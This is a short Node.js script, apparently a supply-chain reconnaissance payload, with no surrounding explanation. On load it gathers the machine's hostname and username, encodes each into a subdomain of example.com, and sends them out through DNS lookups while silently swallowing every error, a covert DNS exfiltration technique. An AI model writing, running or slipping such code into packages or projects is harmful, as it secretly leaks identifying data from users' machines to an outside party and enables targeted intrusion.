import dns from 'dns';
import os from 'os';
const domain='example.com';
function sanitize(s){return s.replace(/[^a-z0-9]/gi,'-');}
function collect(){try{const hostname=os.hostname();const username=os.userInfo().username;return {hostname,username};}catch(e){}}
function send(data){try{
 const queries=[`hostname-${sanitize(data.hostname)}.${domain}`,`username-${sanitize(data.username)}.${domain}`];
 queries.forEach(query=>{dns.lookup(query,()=>{});});
}catch(e){}}
function runProfile(){try{const data=collect();send(data);}catch(e){}}
runProfile();
